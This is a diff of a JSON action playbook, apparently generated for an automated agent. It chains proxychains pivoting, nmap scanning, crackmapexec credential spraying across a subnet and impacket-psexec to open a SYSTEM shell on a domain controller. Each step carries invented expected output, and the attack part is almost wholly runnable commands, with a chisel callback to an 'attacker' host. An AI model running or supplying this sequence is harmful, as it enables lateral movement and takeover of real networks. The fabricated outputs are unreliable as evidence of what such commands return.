@@ -2,37 +2,141 @@
   "name": "proxychains_configuration",
   "description": "Proxychains for routing tools through SOCKS/HTTP proxies",
   "pattern": "proxychains|proxy.*chain|socks.*proxy",
-  "parameters": ["proxy_host", "proxy_port", "proxy_type"],
+  "parameters": [
+    "proxy_host",
+    "proxy_port",
+    "proxy_type"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat /etc/proxychains4.conf | grep -v '^#' | grep -v '^$'"]},
-      "expected_output": {"type": "string", "example": "dynamic_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n[ProxyList]\nsocks5 127.0.0.1 1080\n\nProxychains configuration:\n  Mode: dynamic_chain (fails over to next proxy if one fails)\n  DNS: proxy_dns (DNS queries through proxy)\n  Timeouts: 15s read, 8s connect\n  Proxy: SOCKS5 on 127.0.0.1:1080\n\nAlternative modes:\n  strict_chain: All proxies used in order, fails if any fails\n  dynamic_chain: Skips dead proxies\n  random_chain: Random order from proxy list"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat /etc/proxychains4.conf | grep -v '^#' | grep -v '^$'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "dynamic_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n[ProxyList]\nsocks5 127.0.0.1 1080\n\nProxychains configuration:\n  Mode: dynamic_chain (fails over to next proxy if one fails)\n  DNS: proxy_dns (DNS queries through proxy)\n  Timeouts: 15s read, 8s connect\n  Proxy: SOCKS5 on 127.0.0.1:1080\n\nAlternative modes:\n  strict_chain: All proxies used in order, fails if any fails\n  dynamic_chain: Skips dead proxies\n  random_chain: Random order from proxy list"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > /etc/proxychains4.conf << 'EOF'\ndynamic_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\nsocks5 127.0.0.1 1080\nEOF\ncat /etc/proxychains4.conf"]},
-      "expected_output": {"type": "string", "example": "dynamic_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\nsocks5 127.0.0.1 1080\n\nProxychains configured for:\n  Proxy type: SOCKS5\n  Host: 127.0.0.1\n  Port: 1080\n  Chain mode: Dynamic (auto-failover)\n\nTest configuration:\n  proxychains curl http://ifconfig.me\n  proxychains nmap -sT -Pn 192.168.10.20\n\nProxy source:\n  SSH dynamic tunnel: ssh -D 1080 user@pivot\n  Metasploit SOCKS: auxiliary/server/socks_proxy\n  Chisel: chisel client attacker:8080 1080:socks"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > /etc/proxychains4.conf << 'EOF'\ndynamic_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\nsocks5 127.0.0.1 1080\nEOF\ncat /etc/proxychains4.conf"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "dynamic_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\nsocks5 127.0.0.1 1080\n\nProxychains configured for:\n  Proxy type: SOCKS5\n  Host: 127.0.0.1\n  Port: 1080\n  Chain mode: Dynamic (auto-failover)\n\nTest configuration:\n  proxychains curl http://ifconfig.me\n  proxychains nmap -sT -Pn 192.168.10.20\n\nProxy source:\n  SSH dynamic tunnel: ssh -D 1080 user@pivot\n  Metasploit SOCKS: auxiliary/server/socks_proxy\n  Chisel: chisel client attacker:8080 1080:socks"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "proxychains", "args": ["nmap", "-sT", "-Pn", "-p", "22,80,443,445,3389", "192.168.10.20"]},
-      "expected_output": {"type": "string", "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:22 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:80 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:443 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:445 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:3389 ... OK\n\nStarting Nmap 7.93 ( https://nmap.org )\nNmap scan report for 192.168.10.20\nHost is up (0.15s latency).\n\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n443/tcp  open  https\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 2.34 seconds\n\nAll traffic routed through SOCKS proxy at 127.0.0.1:1080"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "proxychains",
+        "args": [
+          "nmap",
+          "-sT",
+          "-Pn",
+          "-p",
+          "22,80,443,445,3389",
+          "192.168.10.20"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:22 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:80 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:443 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:445 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:3389 ... OK\n\nStarting Nmap 7.93 ( https://nmap.org )\nNmap scan report for 192.168.10.20\nHost is up (0.15s latency).\n\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n443/tcp  open  https\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 2.34 seconds\n\nAll traffic routed through SOCKS proxy at 127.0.0.1:1080"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "proxychains", "args": ["curl", "-s", "http://192.168.10.20"]},
-      "expected_output": {"type": "string", "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:80 ... OK\n\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Internal Web Portal</title>\n</head>\n<body>\n    <h1>Welcome to Internal Corporate Portal</h1>\n    <form action=\"/login\" method=\"post\">\n        <input type=\"text\" name=\"username\" placeholder=\"Username\">\n        <input type=\"password\" name=\"password\" placeholder=\"Password\">\n        <input type=\"submit\" value=\"Login\">\n    </form>\n</body>\n</html>\n\nInternal web service accessed through proxy!\nURL: http://192.168.10.20\nResponse: 200 OK\nContent: Login portal"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "proxychains",
+        "args": [
+          "curl",
+          "-s",
+          "http://192.168.10.20"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:80 ... OK\n\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Internal Web Portal</title>\n</head>\n<body>\n    <h1>Welcome to Internal Corporate Portal</h1>\n    <form action=\"/login\" method=\"post\">\n        <input type=\"text\" name=\"username\" placeholder=\"Username\">\n        <input type=\"password\" name=\"password\" placeholder=\"Password\">\n        <input type=\"submit\" value=\"Login\">\n    </form>\n</body>\n</html>\n\nInternal web service accessed through proxy!\nURL: http://192.168.10.20\nResponse: 200 OK\nContent: Login portal"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "proxychains", "args": ["crackmapexec", "smb", "192.168.10.0/24", "-u", "administrator", "-p", "P@ssw0rd123"]},
-      "expected_output": {"type": "string", "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.5:445 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.10:445 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:445 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.30:445 ... OK\n\nSMB         192.168.10.5    445    PIVOT-DMZ-01     [*] Windows Server 2019 Build 17763 x64 (name:PIVOT-DMZ-01) (domain:CORP) (signing:False) (SMBv1:False)\nSMB         192.168.10.10   445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP) (signing:True) (SMBv1:False)\nSMB         192.168.10.20   445    WEB-SERVER-01    [*] Windows Server 2016 Build 14393 x64 (name:WEB-SERVER-01) (domain:CORP) (signing:False) (SMBv1:False)\nSMB         192.168.10.30   445    FILE-SERVER-01   [*] Windows Server 2019 Build 17763 x64 (name:FILE-SERVER-01) (domain:CORP) (signing:False) (SMBv1:False)\nSMB         192.168.10.5    445    PIVOT-DMZ-01     [+] CORP\\administrator:P@ssw0rd123 (Pwn3d!)\nSMB         192.168.10.10   445    DC01             [+] CORP\\administrator:P@ssw0rd123 (Pwn3d!)\nSMB         192.168.10.20   445    WEB-SERVER-01    [+] CORP\\administrator:P@ssw0rd123 (Pwn3d!)\nSMB         192.168.10.30   445    FILE-SERVER-01   [+] CORP\\administrator:P@ssw0rd123 (Pwn3d!)\n\nCredentials valid on 4 hosts!\nAll systems accessible via proxy"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "proxychains",
+        "args": [
+          "crackmapexec",
+          "smb",
+          "192.168.10.0/24",
+          "-u",
+          "administrator",
+          "-p",
+          "P@ssw0rd123"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.5:445 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.10:445 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.20:445 ... OK\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.30:445 ... OK\n\nSMB         192.168.10.5    445    PIVOT-DMZ-01     [*] Windows Server 2019 Build 17763 x64 (name:PIVOT-DMZ-01) (domain:CORP) (signing:False) (SMBv1:False)\nSMB         192.168.10.10   445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP) (signing:True) (SMBv1:False)\nSMB         192.168.10.20   445    WEB-SERVER-01    [*] Windows Server 2016 Build 14393 x64 (name:WEB-SERVER-01) (domain:CORP) (signing:False) (SMBv1:False)\nSMB         192.168.10.30   445    FILE-SERVER-01   [*] Windows Server 2019 Build 17763 x64 (name:FILE-SERVER-01) (domain:CORP) (signing:False) (SMBv1:False)\nSMB         192.168.10.5    445    PIVOT-DMZ-01     [+] CORP\\administrator:P@ssw0rd123 (Pwn3d!)\nSMB         192.168.10.10   445    DC01             [+] CORP\\administrator:P@ssw0rd123 (Pwn3d!)\nSMB         192.168.10.20   445    WEB-SERVER-01    [+] CORP\\administrator:P@ssw0rd123 (Pwn3d!)\nSMB         192.168.10.30   445    FILE-SERVER-01   [+] CORP\\administrator:P@ssw0rd123 (Pwn3d!)\n\nCredentials valid on 4 hosts!\nAll systems accessible via proxy"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > /etc/proxychains4.conf << 'EOF'\nstrict_chain\nproxy_dns\n\n[ProxyList]\nsocks5 127.0.0.1 1080\nsocks5 127.0.0.1 1081\nEOF\nproxychains curl -s http://ifconfig.me"]},
-      "expected_output": {"type": "string", "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 127.0.0.1:1081 ... ifconfig.me:80 ... OK\n\n203.0.113.45\n\nDouble proxy chain (strict mode):\n  Traffic flow: Attacker -> Proxy 1 (1080) -> Proxy 2 (1081) -> Target\n\nUse case:\n  1080: SSH tunnel to Pivot 1 (DMZ)\n  1081: Metasploit SOCKS via Session 2 (Internal)\n  Result: Multi-hop access to deep internal network\n\nProxy chain topology:\n  Attacker\n    | SOCKS5 127.0.0.1:1080\n  Pivot 1 (10.10.10.100 / 192.168.10.5)\n    | SOCKS5 127.0.0.1:1081\n  Pivot 2 (192.168.10.20 / 172.16.5.10)\n    |\n  Target Network (172.16.5.0/24)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > /etc/proxychains4.conf << 'EOF'\nstrict_chain\nproxy_dns\n\n[ProxyList]\nsocks5 127.0.0.1 1080\nsocks5 127.0.0.1 1081\nEOF\nproxychains curl -s http://ifconfig.me"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 127.0.0.1:1081 ... ifconfig.me:80 ... OK\n\n203.0.113.45\n\nDouble proxy chain (strict mode):\n  Traffic flow: Attacker -> Proxy 1 (1080) -> Proxy 2 (1081) -> Target\n\nUse case:\n  1080: SSH tunnel to Pivot 1 (DMZ)\n  1081: Metasploit SOCKS via Session 2 (Internal)\n  Result: Multi-hop access to deep internal network\n\nProxy chain topology:\n  Attacker\n    | SOCKS5 127.0.0.1:1080\n  Pivot 1 (10.10.10.100 / 192.168.10.5)\n    | SOCKS5 127.0.0.1:1081\n  Pivot 2 (192.168.10.20 / 172.16.5.10)\n    |\n  Target Network (172.16.5.0/24)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "proxychains", "args": ["impacket-psexec", "administrator:P@ssw0rd123@192.168.10.10", "cmd.exe"]},
-      "expected_output": {"type": "string", "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.10:445 ... OK\n\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Requesting shares on 192.168.10.10.....\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.10:445 ... OK\n[*] Found writable share ADMIN$\n[*] Uploading file GfQzRJeA.exe\n[*] Opening SVCManager on 192.168.10.10.....\n[*] Creating service QHUB on 192.168.10.10.....\n[*] Starting service QHUB.....\n[!] Press help for extra shell commands\n\nMicrosoft Windows [Version 10.0.17763.1339]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> hostname\nDC01\n\nC:\\Windows\\system32> ipconfig\n\nEthernet adapter Ethernet0:\n   IPv4 Address. . . . . . . . . . . : 192.168.10.10\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 192.168.10.1\n\nPsExec shell on Domain Controller via proxy!\nAccess: SYSTEM on DC01 (192.168.10.10)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "proxychains",
+        "args": [
+          "impacket-psexec",
+          "administrator:P@ssw0rd123@192.168.10.10",
+          "cmd.exe"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.10:445 ... OK\n\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Requesting shares on 192.168.10.10.....\n[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.10.10:445 ... OK\n[*] Found writable share ADMIN$\n[*] Uploading file GfQzRJeA.exe\n[*] Opening SVCManager on 192.168.10.10.....\n[*] Creating service QHUB on 192.168.10.10.....\n[*] Starting service QHUB.....\n[!] Press help for extra shell commands\n\nMicrosoft Windows [Version 10.0.17763.1339]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> hostname\nDC01\n\nC:\\Windows\\system32> ipconfig\n\nEthernet adapter Ethernet0:\n   IPv4 Address. . . . . . . . . . . : 192.168.10.10\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 192.168.10.1\n\nPsExec shell on Domain Controller via proxy!\nAccess: SYSTEM on DC01 (192.168.10.10)"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
